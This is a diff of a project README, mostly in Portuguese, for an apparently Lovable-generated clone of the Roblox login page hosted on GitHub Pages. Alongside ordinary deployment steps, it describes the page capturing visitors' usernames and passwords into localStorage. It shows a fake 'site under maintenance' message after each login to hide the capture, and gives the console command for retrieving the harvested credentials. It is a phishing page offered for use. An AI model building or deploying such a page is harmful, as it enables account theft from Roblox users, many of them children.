@@ -1,8 +1,108 @@
-# Welcome to your Lovable project
+# Roblox Login Page Clone - Lovable Project
 
 ## Project info
 
 **URL**: https://lovable.dev/projects/a5837cf9-b1db-4faa-aeee-985543ad2627
+
+Esta é uma réplica exata da página de login do Roblox, criada com Lovable e otimizada para hospedagem no GitHub Pages.
+
+## 🚀 Deploy no GitHub Pages
+
+### Configuração Automática via GitHub Actions
+
+1. **Configure o Vite para GitHub Pages:**
+   
+   Edite o arquivo `vite.config.ts` e adicione:
+   ```typescript
+   export default defineConfig({
+     base: '/nome-do-seu-repositorio/',
+     plugins: [react()],
+     // ... outras configurações
+   })
+   ```
+
+2. **Crie o workflow de deploy:**
+   
+   Crie o arquivo `.github/workflows/deploy.yml`:
+   ```yaml
+   name: Deploy to GitHub Pages
+   
+   on:
+     push:
+       branches: [ main ]
+   
+   jobs:
+     deploy:
+       runs-on: ubuntu-latest
+       
+       steps:
+       - uses: actions/checkout@v3
+       
+       - name: Setup Node.js
+         uses: actions/setup-node@v3
+         with:
+           node-version: '18'
+           
+       - name: Install dependencies
+         run: npm install
+         
+       - name: Build
+         run: npm run build
+         
+       - name: Deploy to GitHub Pages
+         uses: peaceiris/actions-gh-pages@v3
+         with:
+           github_token: ${{ secrets.GITHUB_TOKEN }}
+           publish_dir: ./dist
+   ```
+
+3. **Configure GitHub Pages:**
+   - Vá nas Settings do repositório
+   - Na seção Pages, selecione "Deploy from a branch"  
+   - Escolha a branch `gh-pages`
+   - Salve as configurações
+
+### Deploy Manual (Alternativo)
+
+```bash
+# Build do projeto
+npm run build
+
+# Deploy da pasta dist para GitHub Pages
+# (copie o conteúdo da pasta dist para a branch gh-pages)
+```
+
+## 📝 Funcionalidades da Página Roblox
+
+- ✅ **Design idêntico** ao Roblox original
+- ✅ **Formulário funcional** de login
+- ✅ **Dados salvos localmente** (localStorage)
+- ✅ **Mensagem de manutenção** após login: "site em manutenção, tente novamente em instantes"
+- ✅ **Responsivo** para mobile e desktop
+- ✅ **Otimizado** para GitHub Pages
+
+## 🔧 Como funciona o Login
+
+1. **Interface:** Réplica pixel-perfect da página de login do Roblox
+2. **Captura de dados:** Quando o usuário insere usuário/senha e clica "Entrar"
+3. **Armazenamento:** Os dados são salvos no localStorage do navegador
+4. **Feedback:** Mensagem de manutenção é exibida automaticamente
+
+## 📊 Dados Coletados
+
+Os dados inseridos são salvos no `localStorage` com esta estrutura:
+
+```json
+{
+  "usuario": "nome_inserido",
+  "senha": "senha_inserida", 
+  "timestamp": "2024-01-01T00:00:00.000Z"
+}
+```
+
+**Para acessar os dados coletados:**
+1. Abra o Console do navegador (F12)
+2. Digite: `JSON.parse(localStorage.getItem('roblox_users'))`
 
 ## How can I edit this code?
 
